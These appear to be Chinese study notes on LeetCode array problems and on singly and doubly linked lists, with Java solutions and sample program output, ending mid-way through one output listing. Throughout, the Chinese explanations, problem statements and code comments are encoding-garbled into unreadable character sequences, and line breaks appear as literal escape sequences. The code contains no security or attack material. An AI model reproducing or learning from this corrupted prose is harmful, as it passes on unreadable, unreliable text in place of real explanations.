ä¸€ä¸ªæŒ‰ **éé€’å‡é¡ºåº** æ’åºçš„æ•´æ•°æ•°ç»„ `nums`ï¼Œè¿”å› **æ¯ä¸ªæ•°å­—çš„å¹³æ–¹** ç»„æˆçš„æ–°æ•°ç»„ï¼Œè¦æ±‚ä¹ŸæŒ‰ **éé€’å‡é¡ºåº** æ’åºã€‚\n\n**ç¤ºä¾‹ 1ï¼š**\n\n```properties\nè¾“å…¥ï¼šnums = [-4,-1,0,3,10]\nè¾“å‡ºï¼š[0,1,9,16,100]\nè§£é‡Šï¼šå¹³æ–¹åï¼Œæ•°ç»„å˜ä¸º [16,1,0,9,100]\næ’åºåï¼Œæ•°ç»„å˜ä¸º [0,1,9,16,100]\n```\n\n**ç¤ºä¾‹ 2ï¼š**\n\n```properties\nè¾“å…¥ï¼šnums = [-7,-3,2,3,11]\nè¾“å‡ºï¼š[4,9,9,49,121]\n```\n\n```java\n//æ—¶é—´å¤æ‚åº¦æ˜¯ O(n + nlogn)\nclass Solution {\n    public int[] sortedSquares(int[] nums) {\n        for(int i = 0 ; i < nums.length; i++){\n            nums[i] = nums[i] * nums[i];\n        }\n        Arrays.sort(nums);\n        return nums;\n    }\n}\n\n//æ—¶é—´å¤æ‚åº¦ä¸º O(n)\nclass Solution {\n    public int[] sortedSquares(int[] nums) {\n        int[] res = new int[nums.length];\n        int i = 0, j = nums.length - 1, k = nums.length - 1;\n        while(i <= j){\n            if(nums[i]*nums[i] > nums[j] * nums[j]){\n                res[k--] =  nums[i] * nums[i];\n                i++;\n            }\n            else{\n                res[k--] =  nums[j] * nums[j];\n                j--;\n            }\n        }\n        return res;\n    }\n}\n```\n\n#### æ»‘åŠ¨çª—å£ï¼š[209. é•¿åº¦æœ€å°çš„å­æ•°ç»„](https://leetcode.cn/problems/minimum-size-subarray-sum/)\n\nç»™å®šä¸€ä¸ªå«æœ‰ `n` ä¸ªæ­£æ•´æ•°çš„æ•°ç»„å’Œä¸€ä¸ªæ­£æ•´æ•° `target` **ã€‚**\n\næ‰¾å‡ºè¯¥æ•°ç»„ä¸­æ»¡è¶³å…¶å’Œ `â‰¥ target` çš„é•¿åº¦æœ€å°çš„ **è¿ç»­å­æ•°ç»„** `[nums<sub>l</sub>, nums<sub>l+1</sub>, ..., nums<sub>r-1</sub>, nums<sub>r</sub>]` ï¼Œå¹¶è¿”å›å…¶é•¿åº¦**ã€‚**å¦‚æœä¸å­˜åœ¨ç¬¦åˆæ¡ä»¶çš„å­æ•°ç»„ï¼Œè¿”å› `0` \n\n**ç¤ºä¾‹ 1ï¼š**\n\n```properties\nè¾“å…¥ï¼štarget = 7, nums = [2,3,1,2,4,3]\nè¾“å‡ºï¼š2\nè§£é‡Šï¼šå­æ•°ç»„ [4,3] æ˜¯è¯¥æ¡ä»¶ä¸‹çš„é•¿åº¦æœ€å°çš„å­æ•°ç»„ã€‚\n```\n\n**ç¤ºä¾‹ 2ï¼š**\n\n```properties\nè¾“å…¥ï¼štarget = 4, nums = [1,4,4]\nè¾“å‡ºï¼š1\n```\n\n**ç¤ºä¾‹ 3ï¼š**\n\n```properties\nè¾“å…¥ï¼štarget = 11, nums = [1,1,1,1,1,1,1,1]\nè¾“å‡ºï¼š0\n```\n\n```java\n//æ—¶é—´å¤æ‚åº¦ O(n^2)\nclass Solution {\n    public int minSubArrayLen(int target, int[] nums) {\n        int res = Integer.MAX_VALUE;\n        int sum = 0;\n        int sumLen = 0;\n        for(int i = 0 ; i < nums.length; i++){\n            sum = 0;\n            for(int j = i; j < nums.length; j++){\n                sum += nums[j];\n                if(sum >= target){\n                    sumLen = j - i + 1;\n                    res = res > sumLen ? sumLen : res;\n                    break;\n                }\n            } \n        }\n        return res == Integer.MAX_VALUE ? 0 : res;\n    }\n}\n\n//æ—¶é—´å¤æ‚åº¦ O(n)\nclass Solution {\n    // æ»‘åŠ¨çª—å£\n    public int minSubArrayLen(int s, int[] nums) {\n        int left = 0;\n        int sum = 0;\n        int result = Integer.MAX_VALUE;\n        for (int right = 0; right < nums.length; right++) {\n            sum += nums[right];\n            while (sum >= s) {\n                result = Math.min(result, right - left + 1);\n                sum -= nums[left];\n                left++;\n            }\n        }\n        return result == Integer.MAX_VALUE ? 0 : result;\n    }\n}\n```\n\n#### æ¨¡æ‹Ÿæ³•ï¼š [59. èºæ—‹çŸ©é˜µ II](https://leetcode.cn/problems/spiral-matrix-ii/)\n\nç»™ä½ ä¸€ä¸ªæ­£æ•´æ•° `n` ï¼Œç”Ÿæˆä¸€ä¸ªåŒ…å« `1` åˆ° `n<sup>2</sup>` æ‰€æœ‰å…ƒç´ ï¼Œä¸”å…ƒç´ æŒ‰é¡ºæ—¶é’ˆé¡ºåºèºæ—‹æ’åˆ—çš„ `n x n` æ­£æ–¹å½¢çŸ©é˜µ `matrix` ã€‚\n\n**ç¤ºä¾‹ 1ï¼š**\n\n![](https://assets.leetcode.com/uploads/2020/11/13/spiraln.jpg)\n\n```properties\nè¾“å…¥ï¼šn = 3\nè¾“å‡ºï¼š[[1,2,3],[8,9,4],[7,6,5]]\n```\n\n**ç¤ºä¾‹ 2ï¼š**\n\n```properties\nè¾“å…¥ï¼šn = 1\nè¾“å‡ºï¼š[[1]]\n```\n\næ€è·¯ï¼š\n\n-   ç”Ÿæˆä¸€ä¸ª `nÃ—n` ç©ºçŸ©é˜µ `res`ï¼Œéšåæ¨¡æ‹Ÿæ•´ä¸ªå‘å†…ç¯ç»•çš„å¡«å…¥è¿‡ç¨‹ï¼š\n    -   å®šä¹‰å½“å‰å·¦å³ä¸Šä¸‹è¾¹ç•Œ `l,r,t,b`ï¼Œåˆå§‹å€¼ `num = 1`ï¼Œè¿­ä»£ç»ˆæ­¢å€¼ `end = n * n`ï¼›\n    -   å½“ `num <= end` æ—¶ï¼Œå§‹ç»ˆæŒ‰ç…§ `ä»å·¦åˆ°å³` `ä»ä¸Šåˆ°ä¸‹` `ä»å³åˆ°å·¦` `ä»ä¸‹åˆ°ä¸Š` å¡«å…¥é¡ºåºå¾ªç¯ï¼Œæ¯æ¬¡å¡«å…¥åï¼š\n        -   æ‰§è¡Œ `num += 1`ï¼šå¾—åˆ°ä¸‹ä¸€ä¸ªéœ€è¦å¡«å…¥çš„æ•°å­—ï¼›\n        -   æ›´æ–°è¾¹ç•Œï¼šä¾‹å¦‚ä»å·¦åˆ°å³å¡«å®Œåï¼Œä¸Šè¾¹ç•Œ `t += 1`ï¼Œç›¸å½“äºä¸Šè¾¹ç•Œå‘å†…ç¼© 1ã€‚\n    -   ä½¿ç”¨`num <= end`è€Œä¸æ˜¯`l < r || t < b`ä½œä¸ºè¿­ä»£æ¡ä»¶ï¼Œæ˜¯ä¸ºäº†è§£å†³å½“`n`ä¸ºå¥‡æ•°æ—¶ï¼ŒçŸ©é˜µä¸­å¿ƒæ•°å­—æ— æ³•åœ¨è¿­ä»£è¿‡ç¨‹ä¸­è¢«å¡«å……çš„é—®é¢˜ã€‚\n-   æœ€ç»ˆè¿”å› `res` å³å¯ã€‚\n\n```java\nclass Solution {\n    public int[][] generateMatrix(int n) {\n        int l = 0, r = n - 1, t = 0, b = n - 1;\n        int[][] res = new int[n][n];\n        int num = 1, end = n * n;\n        while(num <= end){\n            for(int i = l; i <= r; i++) res[t][i] = num++; // left to right.\n            t++;\n            for(int i = t; i <= b; i++) res[i][r] = num++; // top to bottom.\n            r--;\n            for(int i = r; i >= l; i--) res[b][i] = num++; // right to left.\n            b--;\n            for(int i = b; i >= t; i--) res[i][l] = num++; // bottom to top.\n            l++;\n        }\n        return res;\n    }\n}\n```\n\n#### æ¨¡æ‹Ÿæ³•ï¼š[915. åˆ†å‰²æ•°ç»„](https://leetcode.cn/problems/partition-array-into-disjoint-intervals/description/)\n\nç»™å®šä¸€ä¸ªæ•°ç»„ `nums` ï¼Œå°†å…¶åˆ’åˆ†ä¸ºä¸¤ä¸ªè¿ç»­å­æ•°ç»„ `left` å’Œ `right`ï¼Œ ä½¿å¾—ï¼š\n\n-   `left` ä¸­çš„æ¯ä¸ªå…ƒç´ éƒ½å°äºæˆ–ç­‰äº `right` ä¸­çš„æ¯ä¸ªå…ƒç´ ã€‚\n-   `left` å’Œ `right` éƒ½æ˜¯éç©ºçš„ã€‚\n-   `left` çš„é•¿åº¦è¦å°½å¯èƒ½å°ã€‚\n\nåœ¨å®Œæˆè¿™æ ·çš„åˆ†ç»„åè¿”å› `left` çš„ **é•¿åº¦**ã€‚\n\nç”¨ä¾‹å¯ä»¥ä¿è¯å­˜åœ¨è¿™æ ·çš„åˆ’åˆ†æ–¹æ³•ã€‚\n\n**ç¤ºä¾‹ 1ï¼š**\n\n```properties\nè¾“å…¥ï¼šnums = [5,0,3,8,6]\nè¾“å‡ºï¼š3\nè§£é‡Šï¼šleft = [5,0,3]ï¼Œright = [8,6]\n```\n\n**ç¤ºä¾‹ 2ï¼š**\n\n```properties\nè¾“å…¥ï¼šnums = [1,1,1,0,6,12]\nè¾“å‡ºï¼š4\nè§£é‡Šï¼šleft = [1,1,1,0]ï¼Œright = [6,12]\n```\n\n**ä¸¤æ¬¡éå†ï¼šO(n)**\n\n- å…ˆé€šè¿‡ä¸€æ¬¡éå†ï¼ˆä»åå¾€å‰ï¼‰ç»Ÿè®¡å‡ºæ‰€æœ‰**åç¼€çš„æœ€å°å€¼** `minRight`ï¼ˆä½¿ç”¨æ•°ç»„è¿›è¡Œç»´æŠ¤ï¼‰\n\n- ç„¶åå†é€šè¿‡ç¬¬äºŒæ¬¡éå†ï¼ˆä»å‰å¾€åï¼‰ç»Ÿè®¡æ¯ä¸ª**å‰ç¼€çš„æœ€å¤§å€¼** `maxLeft`ï¼ˆä½¿ç”¨å•å˜é‡è¿›è¡Œç»´æŠ¤ï¼‰\n- ç¬¬ä¸€ä¸ªæ»¡è¶³ `maxLeft â‰¤ minRight[i + 1]` çš„ i å³ä¸ºç­”æ¡ˆï¼Œæ­¤æ—¶ left çš„é•¿åº¦ä¸º i+1ï¼Œå› æ­¤ç­”æ¡ˆéœ€è¿”å› i+1ã€‚\n\n```java\nclass Solution {\n    public int partitionDisjoint(int[] nums) {\n        int[] minRight = new int[nums.length];\n        minRight[nums.length - 1] = nums[nums.length - 1];\n        for(int i = nums.length - 2; i >= 0; i--){\n            minRight[i] = Math.min(nums[i], minRight[i + 1]);\n        }\n        int maxLeft = 0;\n        for(int i = 0; i < nums.length - 1; i++){\n            maxLeft = Math.max(maxLeft, nums[i]);\n            if(maxLeft <= minRight[i + 1]){\n                return i + 1;\n            }\n        }\n        return 0;\n    }\n}\n```\n\n#### å“ˆå¸Œè¡¨ï¼š[1. ä¸¤æ•°ä¹‹å’Œ](https://leetcode.cn/problems/two-sum/description/)\n\nç»™å®šä¸€ä¸ªæ•´æ•°æ•°ç»„ `nums` å’Œä¸€ä¸ªæ•´æ•°ç›®æ ‡å€¼ `target`ï¼Œè¯·ä½ åœ¨è¯¥æ•°ç»„ä¸­æ‰¾å‡º **å’Œä¸ºç›®æ ‡å€¼** _`target`_  çš„é‚£ **ä¸¤ä¸ª** æ•´æ•°ï¼Œå¹¶è¿”å›å®ƒä»¬çš„æ•°ç»„ä¸‹æ ‡ã€‚\n\nä½ å¯ä»¥å‡è®¾æ¯ç§è¾“å…¥åªä¼šå¯¹åº”ä¸€ä¸ªç­”æ¡ˆã€‚ä½†æ˜¯ï¼Œæ•°ç»„ä¸­åŒä¸€ä¸ªå…ƒç´ åœ¨ç­”æ¡ˆé‡Œä¸èƒ½é‡å¤å‡ºç°ã€‚\n\nä½ å¯ä»¥æŒ‰ä»»æ„é¡ºåºè¿”å›ç­”æ¡ˆã€‚\n\n**ç¤ºä¾‹ 1ï¼š**\n\n```properties\nè¾“å…¥ï¼šnums = [2,7,11,15], target = 9\nè¾“å‡ºï¼š[0,1]\nè§£é‡Šï¼šå› ä¸º nums[0] + nums[1] == 9 ï¼Œè¿”å› [0, 1] ã€‚\n```\n\n**ç¤ºä¾‹ 2ï¼š**\n\n```properties\nè¾“å…¥ï¼šnums = [3,2,4], target = 6\nè¾“å‡ºï¼š[1,2]\n```\n\n**ç¤ºä¾‹ 3ï¼š**\n\n```properties\nè¾“å…¥ï¼šnums = [3,3], target = 6\nè¾“å‡ºï¼š[0,1]\n```\n\n**è¿›é˜¶ï¼š**ä½ å¯ä»¥æƒ³å‡ºä¸€ä¸ªæ—¶é—´å¤æ‚åº¦å°äº O(n<sup>2</sup>) çš„ç®—æ³•å—ï¼Ÿ\n\n```java\n//æš´åŠ›æ³•O(n^2)\nclass Solution {\n    public int[] twoSum(int[] nums, int target) {\n        for(int i = 0; i < nums.length; i++){\n            for(int j = i + 1; j < nums.length; j++){\n                if(nums[i] + nums[j] == target){\n                    return new int[]{i,j};\n                }\n            }\n        }\n        return new int[0];\n    }\n}\n//å“ˆå¸Œè¡¨O(n)\nclass Solution {\n    public int[] twoSum(int[] nums, int target) {\n        HashMap<Integer,Integer> map = new HashMap<>();\n        for(int i = 0; i < nums.length; i++){\n            if(map.containsKey(target - nums[i])){\n                return new int[]{map.get(target - nums[i]),i};\n            }\n            map.put(nums[i],i);\n        }\n        return new int[0];\n    }\n}\n```\n\n## â‘¡é“¾è¡¨\n\n### â¶å•å‘é“¾è¡¨\n\n**ç‰¹ç‚¹**\n\n- é“¾è¡¨æ˜¯ä»¥èŠ‚ç‚¹çš„æ–¹å¼æ¥å­˜å‚¨ï¼Œ**æ˜¯é“¾å¼å­˜å‚¨**\n- æ¯ä¸ªèŠ‚ç‚¹åŒ…å« data åŸŸ ï¼ˆå­˜å‚¨æ•°æ®ï¼‰ï¼Œnext åŸŸï¼ˆæŒ‡å‘ä¸‹ä¸€ä¸ªèŠ‚ç‚¹ï¼‰\n- é“¾è¡¨çš„å„ä¸ªèŠ‚ç‚¹ä¸ä¸€å®šæ˜¯è¿ç»­å­˜å‚¨çš„\n- é“¾è¡¨åˆ†**å¸¦å¤´èŠ‚ç‚¹çš„é“¾è¡¨**å’Œ**æ²¡æœ‰å¤´èŠ‚ç‚¹çš„é“¾è¡¨**ï¼Œæ ¹æ®å®é™…çš„éœ€æ±‚æ¥ç¡®å®š\n\n```java\n/**\n * å®šä¹‰èŠ‚ç‚¹\n */\nclass StudentNode {\n    int id;\n    String name;\n    StudentNode next;\n\n    public StudentNode(int id, String name) {\n        this.id = id;\n        this.name = name;\n    }\n\n    @Override\n    public String toString() {\n        return \"StudentNode{\" +\n                \"id=\" + id +\n                \", name='\" + name + '\\'' +\n                '}';\n    }\n}\n\n/**\n * åˆ›å»ºé“¾è¡¨\n */\nclass singleLinkedList {\n    //å¤´èŠ‚ç‚¹ï¼Œé˜²æ­¢è¢«ä¿®æ”¹ï¼Œè®¾ç½®ä¸ºç§æœ‰çš„\n    private StudentNode head = new StudentNode(0, \"\");\n\n    //æ’å…¥èŠ‚ç‚¹\n    public void addNode(StudentNode node) {\n        //å› ä¸ºå¤´èŠ‚ç‚¹ä¸èƒ½è¢«ä¿®æ”¹ï¼Œæ‰€ä»¥åˆ›å»ºä¸€ä¸ªè¾…åŠ©èŠ‚ç‚¹\n        StudentNode temp = head;\n        //æ‰¾åˆ°æœ€åä¸€ä¸ªèŠ‚ç‚¹\n        while (temp.next != null) {\n            temp = temp.next;\n        }\n        temp.next = node;\n    }\n\n    //æŒ‰idé¡ºåºæ’å…¥èŠ‚ç‚¹\n    public void addByOrder(StudentNode node) {\n        //å¦‚æœæ²¡æœ‰é¦–èŠ‚ç‚¹ï¼Œå°±ç›´æ¥æ’å…¥\n        if (head.next == null) {\n            head.next = node;\n            return;\n        }\n        //è¾…åŠ©èŠ‚ç‚¹ï¼Œç”¨äºæ‰¾åˆ°æ’å…¥ä½ç½®å’Œæ’å…¥æ“ä½œ\n        StudentNode temp = head;\n        //èŠ‚ç‚¹çš„ä¸‹ä¸€ä¸ªèŠ‚ç‚¹å­˜åœ¨ï¼Œä¸”å®ƒçš„idå°äºè¦æ’å…¥èŠ‚ç‚¹çš„idï¼Œå°±ç»§ç»­ä¸‹ç§»\n        while (temp.next != null && temp.next.id < node.id) {\n            temp = temp.next;\n        }\n        //å¦‚æœtempçš„ä¸‹ä¸€ä¸ªèŠ‚ç‚¹å­˜åœ¨ï¼Œåˆ™æ‰§è¡Œè¯¥æ“ä½œ\n        //ä¸”æ’å…¥æ“ä½œï¼Œé¡ºåºä¸èƒ½æ¢\n        if (temp.next != null) {\n            node.next = temp.next;\n        }\n        temp.next = node;\n    }\n\n    //éå†é“¾è¡¨\n    public void traverseNode() {\n        if (head.next == null) {\n            System.out.println(\"é“¾è¡¨ä¸ºç©º\");\n        }\n        StudentNode temp = head;\n        while (temp.next != null) {\n            System.out.println(temp.next);\n            temp = temp.next;\n        }\n    }\n\n    //æ ¹æ®idæ¥ä¿®æ”¹èŠ‚ç‚¹ä¿¡æ¯\n    public void changeNode(StudentNode node) {\n        if (head == null) {\n            System.out.println(\"é“¾è¡¨ä¸ºç©ºï¼Œè¯·å…ˆåŠ å…¥è¯¥å­¦ç”Ÿä¿¡æ¯\");\n            return;\n        }\n        StudentNode temp = head;\n        //éå†é“¾è¡¨ï¼Œæ‰¾åˆ°è¦ä¿®æ”¹çš„èŠ‚ç‚¹\n        while (temp.next != null && temp.id != node.id) {\n            temp = temp.next;\n        }\n        //å¦‚æœtempå·²ç»æ˜¯æœ€åä¸€ä¸ªèŠ‚ç‚¹ï¼Œåˆ¤æ–­idæ˜¯å¦ç›¸ç­‰\n        if (temp.id != node.id) {\n            System.out.println(\"æœªæ‰¾åˆ°è¯¥å­¦ç”Ÿçš„ä¿¡æ¯ï¼Œè¯·å…ˆåˆ›å»ºè¯¥å­¦ç”Ÿçš„ä¿¡æ¯\");\n            return;\n        }\n        //ä¿®æ”¹ä¿¡æ¯\n        temp.name = node.name;\n    }\n\n    //åˆ é™¤èŠ‚ç‚¹\n    public void deleteNode(StudentNode node) {\n        if (head.next == null) {\n            System.out.println(\"é“¾è¡¨ä¸ºç©º\");\n            return;\n        }\n        StudentNode temp = head;\n        //éå†é“¾è¡¨ï¼Œæ‰¾åˆ°è¦åˆ é™¤çš„èŠ‚ç‚¹\n        while (temp.next != null && temp.next.id != node.id) {\n            temp = temp.next;\n        }\n        if(temp.next == null){\n            System.out.println(\"è¦åˆ é™¤çš„èŠ‚ç‚¹ä¸å­˜åœ¨\");\n            return;\n        }\n        //åˆ é™¤è¯¥èŠ‚ç‚¹\n        temp.next = temp.next.next;\n\n    }\n\n    //å¾—åˆ°ç¬¬indexä¸ªçš„èŠ‚ç‚¹\n    public StudentNode getNodeByIndex(int index) {\n        if (head.next == null) {\n            System.out.println(\"é“¾è¡¨ä¸ºç©º!\");\n        }\n        StudentNode temp = head;\n        int length = 0;\n        while (temp.next != null) {\n            temp = temp.next;\n            length++;\n        }\n        if (index > length) {\n            throw new RuntimeException(\"é“¾è¡¨è¶Šç•Œ\");\n        }\n\n        temp = head;\n        for (int i = 0; i < index; i++) {\n            temp = temp.next;\n        }\n        return temp;\n    }\n\n    //é€†åºéå†\n    public void reverseTraverse() {\n        if (head == null) {\n            System.out.println(\"é“¾è¡¨ä¸ºç©º\");\n        }\n        StudentNode temp = head;\n        //åˆ›å»ºæ ˆï¼Œç”¨äºå­˜æ”¾éå†åˆ°çš„èŠ‚ç‚¹\n        Stack<StudentNode> stack = new Stack<>();\n        while (temp.next != null) {\n            stack.push(temp.next);\n            temp = temp.next;\n        }\n        while (!stack.isEmpty()) {\n            System.out.println(stack.pop());\n        }\n    }\n}  \n  \n  \n public class SingleLinkedListDemo {\n    public static void main(String[] args) {\n\n        singleLinkedList linkedList = new singleLinkedList();\n\n        //åˆ›å»ºå­¦ç”ŸèŠ‚ç‚¹ï¼Œå¹¶æ’å…¥é“¾è¡¨\n        System.out.println(\"æ’å…¥èŠ‚ç‚¹1å’Œ3ï¼š\");\n        StudentNode student1 = new StudentNode(1, \"Jack\");\n        StudentNode student3 = new StudentNode(3, \"Tom\");\n        linkedList.addNode(student1);\n        linkedList.addNode(student3);\n        linkedList.traverseNode();\n\n        //æŒ‰idå¤§å°æ’å…¥\n        System.out.println(\"æœ‰åºæ’å…¥èŠ‚ç‚¹2ï¼š\");\n        StudentNode student2 = new StudentNode(2, \"Jerry\");\n        linkedList.addByOrder(student2);\n        linkedList.traverseNode();\n\n        //æŒ‰idä¿®æ”¹å­¦ç”Ÿä¿¡æ¯\n        System.out.println(\"ä¿®æ”¹èŠ‚ç‚¹1ä¿¡æ¯ï¼š\");\n        student2 = new StudentNode(1, \"Jack2\");\n        linkedList.changeNode(student2);\n        linkedList.traverseNode();\n\n        //è·å¾—ç¬¬2ä¸ªèŠ‚ç‚¹\n        System.out.println(\"è·å¾—ç¬¬2ä¸ªèŠ‚ç‚¹ï¼š\");\n        System.out.println(linkedList.getNodeByIndex(2));\n\n        //æ ¹æ®idåˆ é™¤å­¦ç”Ÿä¿¡æ¯\n        System.out.println(\"åˆ é™¤å­¦ç”Ÿä¿¡æ¯ï¼š\");\n        student2 = new StudentNode(1, \"Jack2\");\n        linkedList.deleteNode(student2);\n        linkedList.traverseNode();\n        \n        //å€’å™éå†é“¾è¡¨\n        System.out.println(\"å€’åºéå†é“¾è¡¨ï¼š\");\n        linkedList.reverseTraverse();\n\n    }\n} \n```\n\n```\né“¾è¡¨ä¸ºç©º\n\næ’å…¥èŠ‚ç‚¹1å’Œ3ï¼š\nStudentNode{id=1, name='Jack'}\nStudentNode{id=3, name='Tom'}\næœ‰åºæ’å…¥èŠ‚ç‚¹2ï¼š\nStudentNode{id=1, name='Jack'}\nStudentNode{id=2, name='Jerry'}\nStudentNode{id=3, name='Tom'}\nä¿®æ”¹èŠ‚ç‚¹1ä¿¡æ¯ï¼š\nStudentNode{id=1, name='Jack2'}\nStudentNode{id=2, name='Jerry'}\nStudentNode{id=3, name='Tom'}\nè·å¾—ç¬¬2ä¸ªèŠ‚ç‚¹ï¼š\nStudentNode{id=2, name='Jerry'}\nåˆ é™¤å­¦ç”Ÿä¿¡æ¯ï¼š\nStudentNode{id=2, name='Jerry'}\nStudentNode{id=3, name='Tom'}\nå€’åºéå†é“¾è¡¨ï¼š\nStudentNode{id=3, name='Tom'}\nStudentNode{id=2, name='Jerry'}\n```\n\n\n\n### â·åŒå‘é“¾è¡¨\n\n```java\nclass HeroNode {\n    int id;\n    String name;\n    HeroNode next;\n    HeroNode pre;\n\n    public HeroNode(int id, String name) {\n        this.id = id;\n        this.name = name;\n    }\n\n    @Override\n    public String toString() {\n        return \"HeroNode{id=\" + id + \", name=\" + name + \"}\";\n    }\n}\n\n\n/**\n * åˆ›å»ºä¸€ä¸ªåŒå‘é“¾è¡¨çš„ç±»\n */\nclass DoubleLinkedList {\n\n    //åˆå§‹åŒ–ä¸€ä¸ªå¤´èŠ‚ç‚¹ï¼Œå¤´èŠ‚ç‚¹ä¸åŠ¨ï¼Œä¸å­˜æ”¾å…·ä½“çš„æ•°æ®\n    HeroNode head = new HeroNode(0, \"\");\n    //åˆå§‹åŒ–ä¸€ä¸ªå°¾èŠ‚ç‚¹ï¼ŒæŒ‡å‘æœ€åä¸€ä¸ªå…ƒç´ ï¼Œé»˜è®¤ç­‰äºhead\n    HeroNode tail = head;\n\n    //éå†æ‰“å°åŒå‘é“¾è¡¨çš„æ–¹æ³•\n    public void list() {\n        if (head.next == null) {\n            System.out.println(\"é“¾è¡¨ä¸ºç©º\");\n            return;\n        }\n        HeroNode temp = head.next;\n        while (temp != null) {\n            System.out.println(temp);\n            temp = temp.next;\n        }\n    }\n\n    //æ–°å¢èŠ‚ç‚¹\n    public void add(HeroNode heroNode) {\n        tail.next = heroNode;\n        heroNode.pre = tail;\n        tail = heroNode;\n    }\n\n    //æœ‰åºæ–°å¢èŠ‚ç‚¹\n    public void addByOrder(HeroNode heroNode) {\n        HeroNode temp = head;\n        // æ ‡è®°æ·»åŠ çš„ç¼–å·æ˜¯å¦å·²ç»å­˜åœ¨\n        boolean flag = false;\n        while (temp.next != null && temp.next.id <= heroNode.id) {\n            if (temp.next.id == heroNode.id) {\n                flag = true;\n            }\n            temp = temp.next;\n        }\n        // åˆ¤æ–­flag\n        if (flag) {\n            System.out.printf(\"è‹±é›„ç¼–å·ã€%dã€‘å·²ç»å­˜åœ¨äº†\\n\", heroNode.id);\n        } else {\n            // æ’å…¥åˆ°é“¾è¡¨ä¸­\n            // 1ã€å°†ã€heroNodeçš„nextã€‘è®¾ç½®ä¸ºã€tempçš„nextã€‘\n            heroNode.next = temp.next;\n            // åˆ¤æ–­æ˜¯ä¸æ˜¯åŠ åœ¨é“¾è¡¨æœ€å\n            if (temp.next != null) {\n                // 2ã€å°†ã€tempçš„nextçš„preã€‘è®¾ä¸ºä¸ºã€heroNodeã€‘\n                temp.next.pre = heroNode;\n            }\n            // 3ã€å°†ã€tempçš„nextã€‘è®¾ç½®ä¸ºã€heroNodeã€‘\n            temp.next = heroNode;\n            // 4ã€å°†ã€heroNodeçš„preã€‘è®¾ç½®ä¸ºã€tempã€‘\n            heroNode.pre = temp;\n        }\n    }\n\n    //ä¿®æ”¹èŠ‚ç‚¹\n    public void update(HeroNode heroNode) {\n        // åˆ¤æ–­æ˜¯å¦ä¸ºç©º\n        if (head.next == null) {\n            System.out.println(\"é“¾è¡¨ä¸ºç©º~~\");\n            return;\n        }\n        // æ‰¾åˆ°éœ€è¦ä¿®æ”¹çš„èŠ‚ç‚¹\n        HeroNode temp = head.next;\n        // è¡¨ç¤ºæ˜¯å¦æ‰¾åˆ°è¿™ä¸ªèŠ‚ç‚¹\n        boolean flag = false;\n        while (temp != null) {\n            if (temp.id == heroNode.id) {\n                flag = true;\n                break;\n            }\n            temp = temp.next;\n        }\n        // æ ¹æ®flagåˆ¤æ–­æ˜¯å¦æ‰¾åˆ°è¦ä¿®æ”¹çš„èŠ‚ç‚¹\n        if (flag) {\n            temp.name = heroNode.name;\n        } else { // æ²¡æœ‰æ‰¾åˆ°\n            System.out.printf(\"æ²¡æœ‰æ‰¾åˆ°ç¼–å·ä¸º %d çš„èŠ‚ç‚¹ï¼Œä¸èƒ½ä¿®æ”¹\\n\", heroNode.id);\n        }\n    }\n\n    //åˆ é™¤èŠ‚ç‚¹\n    public void delete(int id) {\n        // åˆ¤æ–­å½“å‰é“¾è¡¨æ˜¯å¦ä¸ºç©º\n        if (head.next == null) {\n            System.out.println(\"é“¾è¡¨ä¸ºç©ºï¼Œæ— æ³•åˆ é™¤\");\n            return;\n        }\n        HeroNode temp = head;\n        // æ ‡å¿—æ˜¯å¦æ‰¾åˆ°åˆ é™¤èŠ‚ç‚¹\n        boolean flag = false;\n        while (temp.next != null) {\n            // å·²ç»æ‰¾åˆ°é“¾è¡¨çš„æœ€å\n            if (temp.id == id) {\n                // æ‰¾åˆ°å¾…åˆ é™¤èŠ‚ç‚¹\n                flag = true;\n                break;\n            }\n            temp = temp.next;\n        }\n        // åˆ¤æ–­flagï¼Œæ­¤æ—¶æ‰¾åˆ°è¦åˆ é™¤çš„èŠ‚ç‚¹å°±æ˜¯temp\n        if (flag) {\n            // å¯ä»¥åˆ é™¤ï¼Œå°†ã€tempçš„preçš„nextåŸŸã€‘è®¾ç½®ä¸ºã€tempçš„nextåŸŸã€‘\n            temp.pre.next = temp.next;\n            // å¦‚æœæ˜¯æœ€åä¸€ä¸ªèŠ‚ç‚¹ï¼Œå°±ä¸éœ€è¦æŒ‡å‘ä¸‹é¢è¿™å¥è¯ï¼Œå¦åˆ™ä¼šå‡ºç°ç©ºæŒ‡é’ˆ temp.next.pre = null.pre\n            if (temp.next != null) {\n                temp.next.pre = temp.pre;\n            }\n        }\n    }\n\n}\n\n\npublic class DoubleLinkedListDemo {\n    public static void main(String[] args) {\n        System.out.println(\"åŒå‘é“¾è¡¨:\");\n        // åˆ›å»ºèŠ‚ç‚¹\n        HeroNode her1 = new HeroNode(1, \"å®‹æ±Ÿ\");\n        HeroNode her2 = new HeroNode(2, \"å¢ä¿Šä¹‰\");\n        HeroNode her3 = new HeroNode(3, \"å´ç”¨\");\n        HeroNode her4 = new HeroNode(4, \"æ—å†²\");\n        // åˆ›å»ºä¸€ä¸ªåŒå‘é“¾è¡¨å¯¹è±¡\n        DoubleLinkedList doubleLinkedList = new DoubleLinkedList();\n        doubleLinkedList.add(her1);\n        doubleLinkedList.add(her2);\n        doubleLinkedList.add(her3);\n        doubleLinkedList.add(her4);\n        doubleLinkedList.list();\n\n        // ä¿®æ”¹\n        HeroNode newHeroNode = new HeroNode(4, \"å…¬å­™èƒœ\");\n        doubleLinkedList.update(newHeroNode);\n        System.out.println(\"ä¿®æ”¹èŠ‚ç‚¹4:\");\n        doubleLinkedList.list();\n\n        // åˆ é™¤\n        doubleLinkedList.delete(3);\n        System.out.println(\"åˆ é™¤èŠ‚ç‚¹3\");\n        doubleLinkedList.list();\n        // æµ‹è¯•æœ‰åºæ–°å¢\n        System.out.println(\"æµ‹è¯•æœ‰åºå¢åŠ é“¾è¡¨ï¼š\");\n        DoubleLinkedList doubleLinkedList1 = new DoubleLinkedList();\n        doubleLinkedList1.addByOrder(her3);\n        doubleLinkedList1.addByOrder(her2);\n        doubleLinkedList1.addByOrder(her2);\n        doubleLinkedList1.addByOrder(her4);\n        doubleLinkedList1.addByOrder(her4);\n        doubleLinkedList1.addByOrder(her2);\n        doubleLinkedList1.addByOrder(her1);\n        doubleLinkedList1.list();\n\n    }\n}\n```\n\n```\nåŒå‘é“¾è¡¨:\nHeroNode{id=1, name=å®‹æ±Ÿ}\nHeroNode{id=2, name=å¢ä¿Šä¹‰}\nHeroNode{id=3, name=å´ç”¨}\nHeroNode{id=4, name=æ—å†²}\nä¿®æ”¹èŠ‚ç‚¹4:\nHeroNode{id=1, 